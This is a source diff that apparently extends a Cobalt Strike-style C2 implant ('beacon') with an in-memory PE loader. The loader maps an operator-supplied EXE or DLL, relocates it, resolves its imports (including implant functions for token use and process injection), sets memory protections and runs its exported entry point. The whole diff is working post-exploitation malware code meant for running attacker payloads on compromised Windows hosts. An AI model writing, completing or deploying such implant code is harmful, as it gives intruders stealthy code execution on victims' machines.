@@ -8,6 +8,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <limits.h>
+#include <stddef.h>
 #include "commands.h"
 #include "beacon.h"
 #include "parse.h"
@@ -775,21 +776,450 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	return success;
 }
 
+
+/* ====================================================================
+ * BOF-PE (4.13 inline-execute-pe; NetSPI/CCob proposal format).
+ *
+ * A fully linked PE (EXE or DLL) that exports the BOF entry point
+ * (conventionally `go`) and may import its Beacon API from a virtual
+ * "beacon.dll" - those thunks are plugged straight into our BOFF_FUNCTIONS
+ * table exactly like ftable relocations do for COFF BOFs. All other
+ * imports resolve through LoadLibraryA/GetProcAddress as usual.
+ *
+ * Transport reuses command 100: bssSize carries BOFPE_MAGIC, the "code"
+ * field carries the whole PE image, and the "relocs" field carries the
+ * export name for the entry point. No new opcode, no client/TS protocol
+ * change - the client sniffs MZ and packs this shape itself.
+ *
+ * x64: exception support via RtlAddFunctionTable (.pdata). x86: no
+ * SAFESEH/inverted-table registration (v1 runs x86 PEs without SEH).
+ * ==================================================================== */
+#define BOFPE_MAGIC 0x626F6670   /* "bofp" - must match PostExInlineObject */
+
+typedef struct {
+	const char * name;
+	size_t       off;
+} BOFPE_API_MAP;
+
+/* beacon.dll import name -> BOFF_FUNCTIONS field. Keep in sync with the
+ * struct above; unknown names fail with 0x52 so the operator sees them. */
+static const BOFPE_API_MAP bofpe_apis[] = {
+	{ "LoadLibraryA",                   offsetof(BOFF_FUNCTIONS, LoadLibraryA) },
+	{ "FreeLibrary",                    offsetof(BOFF_FUNCTIONS, FreeLibrary) },
+	{ "GetProcAddress",                 offsetof(BOFF_FUNCTIONS, GetProcAddress) },
+	{ "GetModuleHandleA",               offsetof(BOFF_FUNCTIONS, GetModuleHandleA) },
+	{ "BeaconDataParse",                offsetof(BOFF_FUNCTIONS, BeaconDataParse) },
+	{ "BeaconDataPtr",                  offsetof(BOFF_FUNCTIONS, BeaconDataPtr) },
+	{ "BeaconDataInt",                  offsetof(BOFF_FUNCTIONS, BeaconDataInt) },
+	{ "BeaconDataShort",                offsetof(BOFF_FUNCTIONS, BeaconDataShort) },
+	{ "BeaconDataLength",               offsetof(BOFF_FUNCTIONS, BeaconDataLength) },
+	{ "BeaconDataExtract",              offsetof(BOFF_FUNCTIONS, BeaconDataExtract) },
+	{ "BeaconFormatAlloc",              offsetof(BOFF_FUNCTIONS, BeaconFormatAlloc) },
+	{ "BeaconFormatReset",              offsetof(BOFF_FUNCTIONS, BeaconFormatReset) },
+	{ "BeaconFormatAppend",             offsetof(BOFF_FUNCTIONS, BeaconFormatAppend) },
+	{ "BeaconFormatPrintf",             offsetof(BOFF_FUNCTIONS, BeaconFormatPrintf) },
+	{ "BeaconFormatToString",           offsetof(BOFF_FUNCTIONS, BeaconFormatToString) },
+	{ "BeaconFormatFree",               offsetof(BOFF_FUNCTIONS, BeaconFormatFree) },
+	{ "BeaconFormatInt",                offsetof(BOFF_FUNCTIONS, BeaconFormatInt) },
+	{ "BeaconOutput",                   offsetof(BOFF_FUNCTIONS, BeaconOutput) },
+	{ "BeaconPrintf",                   offsetof(BOFF_FUNCTIONS, BeaconPrintf) },
+	{ "BeaconErrorD",                   offsetof(BOFF_FUNCTIONS, BeaconErrorD) },
+	{ "BeaconErrorDD",                  offsetof(BOFF_FUNCTIONS, BeaconErrorDD) },
+	{ "BeaconErrorNA",                  offsetof(BOFF_FUNCTIONS, BeaconErrorNA) },
+	{ "BeaconUseToken",                 offsetof(BOFF_FUNCTIONS, BeaconUseToken) },
+	{ "BeaconRevertToken",              offsetof(BOFF_FUNCTIONS, BeaconRevertToken) },
+	{ "BeaconIsAdmin",                  offsetof(BOFF_FUNCTIONS, BeaconIsAdmin) },
+	{ "BeaconGetSpawnTo",               offsetof(BOFF_FUNCTIONS, BeaconGetSpawnTo) },
+	{ "BeaconInjectProcess",            offsetof(BOFF_FUNCTIONS, BeaconInjectProcess) },
+	{ "BeaconInjectTemporaryProcess",   offsetof(BOFF_FUNCTIONS, BeaconInjectTemporaryProcess) },
+	{ "BeaconSpawnTemporaryProcess",    offsetof(BOFF_FUNCTIONS, BeaconSpawnTemporaryProcess) },
+	{ "BeaconCleanupProcess",           offsetof(BOFF_FUNCTIONS, BeaconCleanupProcess) },
+	{ "toWideChar",                     offsetof(BOFF_FUNCTIONS, toWideChar) },
+	{ "BeaconInformation",              offsetof(BOFF_FUNCTIONS, BeaconInformation) },
+	{ "BeaconAddValue",                 offsetof(BOFF_FUNCTIONS, BeaconAddValue) },
+	{ "BeaconGetValue",                 offsetof(BOFF_FUNCTIONS, BeaconGetValue) },
+	{ "BeaconRemoveValue",              offsetof(BOFF_FUNCTIONS, BeaconRemoveValue) },
+	{ "BeaconDataStoreGetItem",         offsetof(BOFF_FUNCTIONS, BeaconDataStoreGetItem) },
+	{ "BeaconDataStoreProtectItem",     offsetof(BOFF_FUNCTIONS, BeaconDataStoreProtectItem) },
+	{ "BeaconDataStoreUnprotectItem",   offsetof(BOFF_FUNCTIONS, BeaconDataStoreUnprotectItem) },
+	{ "BeaconDataStoreMaxEntries",      offsetof(BOFF_FUNCTIONS, BeaconDataStoreMaxEntries) },
+	{ "BeaconGetCustomUserData",        offsetof(BOFF_FUNCTIONS, BeaconGetCustomUserData) },
+};
+
+static void * bofpe_resolve_api(BOFF_FUNCTIONS * f, const char * name) {
+	size_t i;
+	for (i = 0; i < sizeof(bofpe_apis) / sizeof(bofpe_apis[0]); i++) {
+		if (strcmp(bofpe_apis[i].name, name) == 0)
+			return (void *)((char *)f + bofpe_apis[i].off);
+	}
+	return NULL;
+}
+
+static BOOL bofpe_rva_ok(char * base, SIZE_T image, DWORD rva, DWORD size) {
+	return rva != 0 && (SIZE_T)rva + size <= image;
+}
+
+static BOOL bofpe_relocate(char * base, SIZE_T image, IMAGE_NT_HEADERS * nt) {
+	IMAGE_BASE_RELOCATION * rel;
+	char * endp;
+	SIZE_T delta = (SIZE_T)base - (SIZE_T)nt->OptionalHeader.ImageBase;
+	DWORD dirSize;
+	IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+	if (delta == 0 || dir.VirtualAddress == 0)
+		return TRUE;
+	if (!bofpe_rva_ok(base, image, dir.VirtualAddress, dir.Size))
+		return TRUE; /* no relocs to apply - trust the linker */
+
+	dirSize = dir.Size;
+	rel = (IMAGE_BASE_RELOCATION *)(base + dir.VirtualAddress);
+	endp = (char *)rel + dirSize;
+
+	while ((char *)rel + sizeof(IMAGE_BASE_RELOCATION) <= endp && rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
+		int count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+		WORD * entry = (WORD *)((char *)rel + sizeof(IMAGE_BASE_RELOCATION));
+		char * page = base + rel->VirtualAddress;
+
+		while (count-- > 0) {
+			int type = (*entry) >> 12;
+			int offs = (*entry) & 0xFFF;
+			char * target = page + offs;
+			entry++;
+
+			if ((SIZE_T)(target - base) + 8 > image)
+				return FALSE;
+
+			if (type == IMAGE_REL_BASED_DIR64)
+				*(UINT64 *)target += (UINT64)delta;
+			else if (type == IMAGE_REL_BASED_HIGHLOW)
+				*(DWORD *)target += (DWORD)delta;
+			else if (type == IMAGE_REL_BASED_ABSOLUTE)
+				continue;
+			else
+				return FALSE;
+		}
+		rel = (IMAGE_BASE_RELOCATION *)((char *)rel + rel->SizeOfBlock);
+	}
+	return TRUE;
+}
+
+static BOOL bofpe_imports(BOFF_FUNCTIONS * f, char * base, SIZE_T image, IMAGE_NT_HEADERS * nt) {
+	IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	IMAGE_IMPORT_DESCRIPTOR * desc;
+
+	if (dir.VirtualAddress == 0)
+		return TRUE;
+	if (!bofpe_rva_ok(base, image, dir.VirtualAddress, dir.Size))
+		return FALSE;
+
+	desc = (IMAGE_IMPORT_DESCRIPTOR *)(base + dir.VirtualAddress);
+	while (desc->Name != 0) {
+		char * dllName;
+		HMODULE mod = NULL;
+		BOOL isBeacon = FALSE;
+
+		if (!bofpe_rva_ok(base, image, desc->Name, 2))
+			return FALSE;
+		dllName = base + desc->Name;
+
+		if (_stricmp(dllName, "beacon.dll") == 0) {
+			isBeacon = TRUE;
+		}
+		else {
+			mod = f->GetModuleHandleA(dllName);
+			if (mod == NULL)
+				mod = f->LoadLibraryA(dllName);
+			if (mod == NULL) {
+				post_error(0x51, "%s", dllName);
+				return FALSE;
+			}
+		}
+
+		{
+			IMAGE_THUNK_DATA * oft = (IMAGE_THUNK_DATA *)(desc->OriginalFirstThunk
+				? base + desc->OriginalFirstThunk : base + desc->FirstThunk);
+			IMAGE_THUNK_DATA * iat = (IMAGE_THUNK_DATA *)(base + desc->FirstThunk);
+
+			while (iat != NULL && oft->u1.AddressOfData != 0) {
+				void * proc = NULL;
+				if (oft->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+					proc = (void *)f->GetProcAddress(mod, (LPCSTR)(oft->u1.Ordinal & 0xFFFF));
+					if (proc == NULL) {
+						post_error(0x52, "%s!#%lu", dllName, (unsigned long)(oft->u1.Ordinal & 0xFFFF));
+						return FALSE;
+					}
+				}
+				else {
+					IMAGE_IMPORT_BY_NAME * byName;
+					if (!bofpe_rva_ok(base, image, (DWORD)oft->u1.AddressOfData, 3)) {
+						post_error_na(0x4d);
+						return FALSE;
+					}
+					byName = (IMAGE_IMPORT_BY_NAME *)(base + oft->u1.AddressOfData);
+					if (isBeacon) {
+						proc = bofpe_resolve_api(f, (char *)byName->Name);
+					}
+					else {
+						proc = (void *)f->GetProcAddress(mod, (char *)byName->Name);
+					}
+					if (proc == NULL) {
+						post_error(0x52, "%s!%s", dllName, (char *)byName->Name);
+						return FALSE;
+					}
+				}
+				*(void **)&iat->u1.Function = proc;
+				oft++;
+				iat++;
+			}
+		}
+		desc++;
+	}
+	return TRUE;
+}
+
+static void * bofpe_find_export(char * base, SIZE_T image, IMAGE_NT_HEADERS * nt, const char * name, int namelen) {
+	IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+	IMAGE_EXPORT_DIRECTORY * exp;
+	DWORD * names, * funcs;
+	WORD * ords;
+	int i;
+
+	if (dir.VirtualAddress == 0)
+		return NULL;
+	if (!bofpe_rva_ok(base, image, dir.VirtualAddress, dir.Size))
+		return NULL;
+	exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir.VirtualAddress);
+	if (!bofpe_rva_ok(base, image, exp->AddressOfNames, exp->NumberOfNames * 4))
+		return NULL;
+	names = (DWORD *)(base + exp->AddressOfNames);
+	if (!bofpe_rva_ok(base, image, exp->AddressOfFunctions, exp->NumberOfFunctions * 4))
+		return NULL;
+	funcs = (DWORD *)(base + exp->AddressOfFunctions);
+	if (!bofpe_rva_ok(base, image, exp->AddressOfNameOrdinals, exp->NumberOfNames * 2))
+		return NULL;
+	ords = (WORD *)(base + exp->AddressOfNameOrdinals);
+
+	for (i = 0; i < (int)exp->NumberOfNames; i++) {
+		char * cand;
+		if (!bofpe_rva_ok(base, image, names[i], namelen + 1))
+			continue;
+		cand = base + names[i];
+		if (strncmp(cand, name, namelen) == 0 && cand[namelen] == 0) {
+			if (!bofpe_rva_ok(base, image, funcs[ords[i]], 1))
+				return NULL;
+			return base + funcs[ords[i]];
+		}
+	}
+	return NULL;
+}
+
+static void bofpe_section_perms(char * base, IMAGE_NT_HEADERS * nt) {
+	IMAGE_SECTION_HEADER * sec = IMAGE_FIRST_SECTION(nt);
+	int i;
+	DWORD oldp = 0;
+
+	VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldp);
+	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+		DWORD fl = sec[i].Characteristics;
+		DWORD prot, size;
+		char * at;
+		if (sec[i].SizeOfRawData == 0 && sec[i].Misc.VirtualSize == 0)
+			continue;
+		prot = PAGE_READONLY;
+		if (fl & IMAGE_SCN_MEM_WRITE)
+			prot = PAGE_READWRITE;
+		if (fl & IMAGE_SCN_MEM_EXECUTE) {
+			prot = (fl & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
+			if (fl & IMAGE_SCN_MEM_DISCARDABLE)
+				prot = PAGE_EXECUTE_READ;
+		}
+		at = base + sec[i].VirtualAddress;
+		size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
+		VirtualProtect(at, size, prot, &oldp);
+	}
+}
+
+/* map, resolve, execute and tear down one BOF-PE image */
+void command_inline_execute_pe(char * pe, int pelen, char * entryName, int entryLen, char * args, int alen) {
+	IMAGE_DOS_HEADER * dos;
+	IMAGE_NT_HEADERS * nt;
+	IMAGE_SECTION_HEADER * sec;
+	char * base = NULL;
+	SIZE_T image;
+	int how = 0;
+	int i;
+	BOFF_FUNCTIONS * ftable = NULL;
+	void (*entry)(char *, int);
+	BOOL ok = TRUE;
+#if defined _M_X64
+	BOOL fnTableAdded = FALSE;
+	void (WINAPI *pRtlAddFunctionTable)(void *, DWORD, UINT64) = NULL;
+	BOOL (WINAPI *pRtlDeleteFunctionTable)(void *) = NULL;
+#endif
+
+	if (pelen < (int)sizeof(IMAGE_DOS_HEADER)) {
+		post_error_na(0x50);
+		return;
+	}
+	dos = (IMAGE_DOS_HEADER *)pe;
+	if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0
+	    || pelen < dos->e_lfanew + (int)sizeof(IMAGE_NT_HEADERS)) {
+		post_error_na(0x50);
+		return;
+	}
+	nt = (IMAGE_NT_HEADERS *)(pe + dos->e_lfanew);
+	if (nt->Signature != IMAGE_NT_SIGNATURE
+#if defined _M_X64
+	    || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64
+#elif defined _M_IX86
+	    || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386
+#endif
+	   ) {
+		post_error_na(0x50);
+		return;
+	}
+	image = nt->OptionalHeader.SizeOfImage;
+	if (image == 0 || image > (SIZE_T)0x10000000) { /* 256MB sanity cap */
+		post_error_na(0x50);
+		return;
+	}
+	/* every section's raw data must live inside the supplied buffer */
+	sec = IMAGE_FIRST_SECTION(nt);
+	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+		if ((SIZE_T)sec[i].PointerToRawData + sec[i].SizeOfRawData > (SIZE_T)pelen) {
+			post_error_na(0x50);
+			return;
+		}
+	}
+
+	base = bof_alloc(image, &how);
+	if (base == NULL) {
+		post_error_na(0x50);
+		return;
+	}
+	memset(base, 0, image);
+	memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);
+	sec = IMAGE_FIRST_SECTION(nt);
+	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+		if (sec[i].PointerToRawData && sec[i].SizeOfRawData)
+			memcpy(base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);
+	}
+
+	/* headers are mapped: re-derive nt against the mapping */
+	nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+
+	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
+	if (ftable == NULL) {
+		bof_free(base, how);
+		return;
+	}
+	setup_functions(ftable);
+
+	ok = bofpe_relocate(base, image, nt);
+	if (!ok) {
+		post_error_na(0x4d);
+		goto cleanup;
+	}
+	ok = bofpe_imports(ftable, base, image, nt);
+	if (!ok)
+		goto cleanup;
+
+	bofpe_section_perms(base, nt);
+
+#if defined _M_X64
+	{
+		IMAGE_DATA_DIRECTORY ex = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+		if (ex.VirtualAddress && ex.Size >= sizeof(RUNTIME_FUNCTION)) {
+			HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+			if (ntdll != NULL) {
+				pRtlAddFunctionTable = (void (WINAPI *)(void *, DWORD, UINT64))
+					(void *)GetProcAddress(ntdll, "RtlAddFunctionTable");
+				pRtlDeleteFunctionTable = (BOOL (WINAPI *)(void *))
+					(void *)GetProcAddress(ntdll, "RtlDeleteFunctionTable");
+			}
+			if (pRtlAddFunctionTable != NULL
+			    && pRtlAddFunctionTable(base + ex.VirtualAddress, ex.Size / sizeof(RUNTIME_FUNCTION), (UINT64)base)) {
+				fnTableAdded = TRUE;
+			}
+		}
+	}
+#endif
+
+	if (entryName == NULL || entryLen <= 0) {
+		entryName = "go";
+		entryLen = 2;
+	}
+	entry = (void (*)(char *, int))bofpe_find_export(base, image, nt, entryName, entryLen);
+	if (entry == NULL) {
+		post_error(0x53, "%.*s", entryLen, entryName);
+		ok = FALSE;
+		goto cleanup;
+	}
+
+	if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
+		BOOL (WINAPI * dllmain)(void *, DWORD, void *);
+		dllmain = (BOOL (WINAPI *)(void *, DWORD, void *))(base + nt->OptionalHeader.AddressOfEntryPoint);
+		if (dllmain != NULL)
+			dllmain((void *)base, DLL_PROCESS_ATTACH, NULL);
+	}
+
+	entry(args, alen);
+
+cleanup:
+#if defined _M_X64
+	if (fnTableAdded && pRtlDeleteFunctionTable != NULL) {
+		IMAGE_DATA_DIRECTORY ex2 = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+		pRtlDeleteFunctionTable(base + ex2.VirtualAddress);
+	}
+#endif
+	{
+		DWORD oldrw = 0;
+		VirtualProtect(base, image, PAGE_READWRITE, &oldrw);
+	}
+	memset(base, 0, image);
+	bof_free(base, how);
+	bof_free_slot_table(ftable);
+	memset(ftable, 0, sizeof(*ftable));
+	free(ftable);
+	(void)ok;
+}
+
 void command_inline_execute_object(char * buffer, int length) {
 	datap parser;
+	datap_buffer code, relocs;
 	DWORD entry;
 	datap_buffer args;
 	int prefix_len;
 
 	data_init(&parser, buffer, length);
-	data_int(&parser);       /* bssSize */
-	data_extract(&parser);   /* code */
-	data_extract(&parser);   /* rdata */
-	data_extract(&parser);   /* data */
-	data_extract(&parser);   /* xdata */
-	data_extract(&parser);   /* pdata */
-	data_extract(&parser);   /* relocs */
-	prefix_len = length - parser.length;
+	prefix_len = data_int(&parser);  /* bssSize (BOF) / BOFPE_MAGIC (PE) */
+	code = data_extract(&parser);    /* code (BOF) / whole PE image (PE) */
+	data_extract(&parser);           /* rdata */
+	data_extract(&parser);           /* data */
+	data_extract(&parser);           /* xdata */
+	data_extract(&parser);           /* pdata */
+	relocs = data_extract(&parser);  /* relocs (BOF) / entry export name (PE) */
+	if (prefix_len == BOFPE_MAGIC) {
+		entry = data_int(&parser);   /* unused for PE */
+		args = data_extract(&parser);
+		command_inline_execute_pe(code.buffer, code.length,
+		                          relocs.buffer, relocs.length,
+		                          args.buffer, args.length);
+		return;
+	}
+	/* re-parse the normal BOF shape (parser already consumed prefix_len) */
+	{
+		datap p2;
+		data_init(&p2, buffer, length);
+		data_int(&p2);
+		data_extract(&p2);
+		data_extract(&p2);
+		data_extract(&p2);
+		data_extract(&p2);
+		data_extract(&p2);
+		data_extract(&p2);
+		prefix_len = length - p2.length;
+	}
 	entry = data_int(&parser);
 	args = data_extract(&parser);
 	command_inline_execute_object_parsed(buffer, prefix_len, entry, args.buffer, args.length, 0);
